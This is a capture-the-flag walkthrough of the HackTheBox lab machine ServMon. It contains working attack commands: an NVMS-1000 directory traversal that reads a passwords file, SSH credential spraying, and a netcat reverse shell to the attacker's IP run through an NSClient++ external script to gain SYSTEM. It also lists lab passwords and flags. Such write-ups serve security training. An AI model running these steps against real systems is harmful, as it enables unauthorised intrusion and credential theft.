---
layout: post
title: Hackthebox ServMon Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/servmon.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `ServMon`.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:/# nmap -p- 10.10.10.184 -sV -sC
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 09:19 JST
Nmap scan report for 10.10.10.184
Host is up (0.26s latency).
Not shown: 65507 closed ports
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  11:05AM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open     ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
3903/tcp  filtered charsetmgr
5040/tcp  open     unknown
5166/tcp  filtered winpcs
5635/tcp  filtered sfmsso
5666/tcp  open     tcpwrapped
6063/tcp  open     tcpwrapped
6699/tcp  open     napster?
7680/tcp  open     pando-pub?
8443/tcp  open     ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|_    :Saturday
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
13864/tcp filtered unknown
14519/tcp filtered unknown
44832/tcp filtered unknown
46769/tcp filtered unknown
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
56131/tcp filtered unknown
61003/tcp filtered unknown
61971/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=12/13%Time=5FD56463%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocatio
SF:n:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\0
SF:\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0")%r(HTTPOptions,36,"HTTP/1
SF:\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r
SF:(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
SF:nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x20404\r\nConte
SF:nt-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIPOptions,36,"HTT
SF:P/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found"
SF:);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7m26s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-12-13T00:56:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1771.40 seconds
```

#### FTP Enumeration:
```
root@kali:/# wget -r ftp://anonymous@10.10.10.184

---

root@kali:/# find 10.10.10.184/ -type f
10.10.10.184/Users/Nadine/Confidential.txt
10.10.10.184/Users/Nathan/Notes to do.txt

---

root@kali:/# cat 10.10.10.184/Users/Nathan/Notes\ to\ do.txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

---

root@kali:/# cat 10.10.10.184/Users/Nadine/Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

#### SMB Enumeration:
```
root@kali:/# smbmap -H 10.10.10.184
[!] Authentication error on 10.10.10.184
root@kali:/# smbmap -H 10.10.10.184 -u null
[!] Authentication error on 10.10.10.184
```

#### Gobuster Port 80:
```
root@kali:/# gobuster dir -u http://10.10.10.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.184
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/13 09:56:21 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.184/31065b41-6087-4b6a-aeb3-8be56ccbac20 => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
```

#### Gobuster Port 8443:
```
root@kali:/# gobuster dir -u http://10.10.10.184:8443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.184:8443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/13 10:06:57 Starting gobuster
===============================================================
Error: error on running goubster: unable to connect to http://10.10.10.184:8443/: Get http://10.10.10.184:8443/: read tcp 10.10.14.42:44940->10.10.10.184:8443: read: connection reset by peer
```

## 2. Getting User

Taking a look at `http://10.10.10.184`.<br>
We can find a login console for `NVMS-1000`.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

Search vulnerabilities using `Searchsploit`.<br>
We can find directory traversal vulnerabilities for `NVMS 1000`
```
root@kali:/# searchsploit nvms
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                     | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification    | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                  | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                 | hardware/webapps/48311.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts 10.10.10.184
rhosts => 10.10.10.184
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set filepath /windows/win.ini
filepath => /windows/win.ini
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > run

[+] 10.10.10.184:80 - Downloaded 92 bytes
[+] File saved in: /root/.msf4/loot/20201213101747_default_10.10.10.184_nvms.traversal_963898.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

---

root@kali:/# cat /root/.msf4/loot/20201213101747_default_10.10.10.184_nvms.traversal_963898.txt
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

```
msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts 10.10.10.184
rhosts => 10.10.10.184
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set filepath /users/nathan/desktop/passwords.txt
filepath => /users/nathan/desktop/passwords.txt
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > run

[+] 10.10.10.184:80 - Downloaded 156 bytes
[+] File saved in: /root/.msf4/loot/20201213102411_default_10.10.10.184_nvms.traversal_836293.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

---

root@kali:/# cat /root/.msf4/loot/20201213102411_default_10.10.10.184_nvms.traversal_836293.txt
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

```
root@kali:/# cat users.txt 
nadine
nathan
root@kali:/# cat passwords.txt 
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.10.10.184
rhosts => 10.10.10.184
msf6 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt
user_file => users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt
pass_file => passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] 10.10.10.184:22 - Success: 'nadine:L1k3B1gBut7s@W0rk' ''id' is not recognized as an internal or external command,  operable program or batch file.  '
[*] Command shell session 1 opened (10.10.14.42:35027 -> 10.10.10.184:22) at 2020-12-13 10:29:27 +0900
[-] 10.10.10.184:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>
```

```
nadine@SERVMON C:\Users\Nadine>type .\desktop\user.txt
type .\desktop\user.txt
db18154361a424fdba2ec9985560b178
```

## 3. Getting Root

```
nadine@SERVMON C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Program Files

08/04/2020  22:21    <DIR>          .
08/04/2020  22:21    <DIR>          ..
08/04/2020  22:21    <DIR>          Common Files
08/04/2020  22:18    <DIR>          Internet Explorer
19/03/2019  04:52    <DIR>          ModifiableWindowsApps
16/01/2020  18:11    <DIR>          NSClient++
08/04/2020  22:09    <DIR>          Reference Assemblies
23/07/2020  12:59    <DIR>          UNP
14/01/2020  08:14    <DIR>          VMware
08/04/2020  21:31    <DIR>          Windows Defender
08/04/2020  21:45    <DIR>          Windows Defender Advanced Threat Protection
19/03/2019  04:52    <DIR>          Windows Mail
19/03/2019  11:43    <DIR>          Windows Multimedia Platform
19/03/2019  05:02    <DIR>          Windows NT
19/03/2019  11:43    <DIR>          Windows Photo Viewer
19/03/2019  11:43    <DIR>          Windows Portable Devices
19/03/2019  04:52    <DIR>          Windows Security
19/03/2019  04:52    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              18 Dir(s)  27,728,986,112 bytes free
```

```
nadine@SERVMON C:\Program Files>dir .\NSClient++
dir .\NSClient++
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Program Files\NSClient++

16/01/2020  18:11    <DIR>          .
16/01/2020  18:11    <DIR>          ..
09/12/2015  00:17            28,672 boost_chrono-vc110-mt-1_58.dll
09/12/2015  00:17            50,688 boost_date_time-vc110-mt-1_58.dll
09/12/2015  00:17           117,760 boost_filesystem-vc110-mt-1_58.dll
09/12/2015  00:22           439,296 boost_program_options-vc110-mt-1_58.dll
09/12/2015  00:23           256,000 boost_python-vc110-mt-1_58.dll
09/12/2015  00:17           765,952 boost_regex-vc110-mt-1_58.dll
09/12/2015  00:16            19,456 boost_system-vc110-mt-1_58.dll
09/12/2015  00:18           102,400 boost_thread-vc110-mt-1_58.dll
14/01/2020  13:24                51 boot.ini
18/01/2018  15:51           157,453 changelog.txt
28/01/2018  22:33         1,210,392 check_nrpe.exe
08/04/2020  09:48    <DIR>          crash-dumps
05/11/2017  21:09           318,464 Google.ProtocolBuffers.dll
08/12/2015  23:16         1,655,808 libeay32.dll
05/11/2017  22:04            18,351 license.txt
05/10/2017  07:19           203,264 lua.dll
14/01/2020  13:24    <DIR>          modules
10/04/2020  18:32             2,683 nsclient.ini
13/12/2020  02:26            30,930 nsclient.log
05/11/2017  21:42            55,808 NSCP.Core.dll
28/01/2018  22:32         4,765,208 nscp.exe
05/11/2017  21:42           483,328 NSCP.Protobuf.dll
19/11/2017  16:18           534,016 nscp_json_pb.dll
19/11/2017  15:55         2,090,496 nscp_lua_pb.dll
23/01/2018  20:57           507,904 nscp_mongoose.dll
19/11/2017  15:49         2,658,304 nscp_protobuf.dll
05/11/2017  22:04             3,921 old-settings.map
28/01/2018  22:21         1,973,760 plugin_api.dll
23/05/2015  08:44         3,017,216 python27.dll
27/09/2015  15:42        28,923,515 python27.zip
28/01/2018  22:34           384,536 reporter.exe
14/01/2020  13:24    <DIR>          scripts
14/01/2020  13:24    <DIR>          security
08/12/2015  23:16           348,160 ssleay32.dll
23/05/2015  08:44           689,664 unicodedata.pyd
14/01/2020  13:24    <DIR>          web
05/11/2017  21:20         1,273,856 where_filter.dll
23/05/2015  08:44            47,616 _socket.pyd
              33 File(s)     53,134,928 bytes
               7 Dir(s)  27,728,986,112 bytes free
```

```
nadine@SERVMON C:\Program Files>type .\NSClient++\nsclient.ini
type .\NSClient++\nsclient.ini
# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1


; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3

; Undocumented key
verify mode = peer-cert

; Undocumented key
insecure = false


; in flight - TODO
[/modules]

; Undocumented key
CheckHelpers = disabled

; Undocumented key
CheckEventLog = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true
```

```
root@kali:~# ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
nadine@10.10.10.184's password:  # L1k3B1gBut7s@W0rk

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

Now we can access to `https://10.10.10.184:8443`
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

We already know the password `ew2x6SsGTxjRwXOT`
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

To create an external script, we can go `Settings` -> `External Scripts` -> `Scripts` -> `+ Add new`.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

Then, we have this console.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

Before adding an external script, upload `nc64.exe` which can be downloaded.
```
root@kali:~# cat rshell.bat 
@echo off
C:\Temp\nc64.exe 10.10.14.42 4443 -e cmd.exe

root@kali:~# scp ./rshell.bat  nadine@10.10.10.184:C:/temp/rshell.bat
nadine@10.10.10.184's password:
rshell.bat                                    100%   55     0.2KB/s   00:00

root@kali:~# scp ./nc64.exe nadine@10.10.10.184:C:/temp/nc64.exe
nadine@10.10.10.184's password:
nc64.exe                                      100%   44KB  54.4KB/s   00:00
```

Add the following new external script here.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)

```
; in flight - TODO
[/settings/external scripts/scripts/rshell]

; COMMAND - Command to execute
command = C:\temp\rshell.bat
```

```
root@kali:~# nc -nlvp 4443
Listening on 0.0.0.0 4443
```


```
root@kali:~# nc -nlvp 4443
Listening on 0.0.0.0 4443
Connection received on 10.10.10.184 53308
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

```
C:\Program Files\NSClient++>type C:\users\administrator\desktop\root.txt
type C:\users\administrator\desktop\root.txt
5d7af017e7cb626125c96ce510ae37c0
```

